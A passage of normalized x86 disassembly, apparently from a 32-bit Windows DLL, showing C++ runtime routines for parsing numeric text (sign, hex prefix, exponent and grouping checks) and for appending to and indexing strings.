je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_10004ee1
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10048b8e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x30 ]
push eax
mov ecx ebx
mov [ esp + 0x24 ] ebx
call sub_10007b59
and [ esp + 0x60 ] 0x0
push eax
call sub_100063b6
or [ esp + 0x64 ] 0xffffffff
pop ecx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c ] eax
call sub_10007b41
mov ecx [ esp + 0x2c ]
lea eax [ esp + 0x34 ]
push eax
call sub_10005db0
xor ecx ecx
inc ecx
mov [ esp + 0x60 ] ecx
mov al [ esi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x18 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x38 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ esp + 0x4c ] 0x10
mov eax ecx
jae r-xdata
and [ esp + 0x18 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] 0x10
mov ecx [ esp + 0x38 ]
mov eax ecx
jae r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ esp + 0x20 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x28 ]
call sub_10005cdd
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ esp + 0x54 ]
mov [ ebp + 0x14 ] eax
push [ esp + 0x40 ]
call sub_1000516f
add esp 0x34
push 0x0
push 0x1
lea ecx [ esp + 0x3c ]
call sub_100023ce
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn
cmp eax 0x100
lea eax [ esp + 0x20 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x18 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_10005c92
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ esp + 0x3c ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ esp + 0x48 ]
push eax
push [ esp + 0x3c ]
add esi ecx
call sub_1000516f
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_1000516f
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ esp + 0x38 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ esp + 0x14 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ esp + 0x18 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100203cb
mov eax [ esp + 0x24 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
sub_1000513a
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10005d76
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1000516f
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_10005d76
dec [ ebp + 0x1c ]
jne r-xdata
sub_10005198
push 0x64
mov eax sub_10048038
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_100063b6
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10005db0
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_100070de
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_10006709
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_100070de
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005d9c
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x2d
call sub_100070de
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005d9c
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_10005eb7
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_10005d9c
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_10005eb7
push [ ebp - 0x5c ]
push edi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_10005d9c
movzx eax ax
push eax
call sub_10006f73
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_100208d0
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_100070de
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005d9c
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005ad1
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_100070de
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005d9c
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10005eb7
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10005d9c
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100023ce
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x50 ]
call sub_10023f1f
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc ebx
mov ecx edi
call sub_10005eb7
push [ ebp - 0x5c ]
push edi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_100054e8
push 0x60
mov eax sub_10048b59
call sub_10023e9c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_100063b6
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_10005db0
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_100070de
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_10006709
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10005eb7
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_10005d9c
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_10005ad1
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_100208a9
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_10005eb7
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_10005d9c
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10005eb7
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100023ce
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10005eb7
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10005d9c
cmp ax di
jne r-xdata
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10005eb7
mov ecx esi
call sub_10005d9c
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_100023ce
mov eax [ ebp - 0x60 ]
call sub_10023f1f
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_10005eb7
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_10006709
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005af7
inc [ ebp - 0x5c ]
mov ecx esi
call sub_10005d9c
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_10005eb7
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_100070de
add esp 0xc
mov ecx esi
mov di ax
call sub_10005d9c
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10005eb7
push [ ebp - 0x58 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10005eb7
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10005eb7
mov ecx esi
call sub_10005d9c
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_10005af7
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_1001afff
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_10002419
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_10005e24
push esi
mov ecx edi
call sub_10002493
sub_10005b45
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_10002419
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
sub eax edi
sub eax [ ebp + 0xc ]
add edx edi
push edx
add ecx edi
add ecx [ ebp + 0xc ]
push eax
push ecx
call sub_10002127
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_10005e24
push ebx
mov ecx esi
call sub_10002493
mov ecx [ ecx ]
cmp eax 0x10
jb r-xdata
sub_10005bdf
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_1002059f
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop edi
pop esi
retn 0x4
sub_10005c07
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_1001afff
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_10001fc4
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_10005e6c
push esi
mov ecx edi
call sub_10002579
sub_10005c55
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_10001fc4
test al al
je r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_10005e6c
push edi
mov ecx esi
call sub_10002579
sub_10005c92
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_100070de
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_10005d76
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_10005cdd
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10005c92
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call sub_1000516f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_100208d0
add esp 0xc
test eax eax
je r-xdata
sub_10005d76
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ esp + 0x8 ]
call sub_10007c92
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
retn 0x4
sub_10005de7
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_10002419
test al al
je r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_10005e24
push edi
mov ecx esi
call sub_10002493
sub_10005e24
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
add ecx eax
push ecx
call sub_10006e6b
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
jmp r-xdata
sub_10005e6c
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10006e41
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_10005eb7
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1003b24c
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
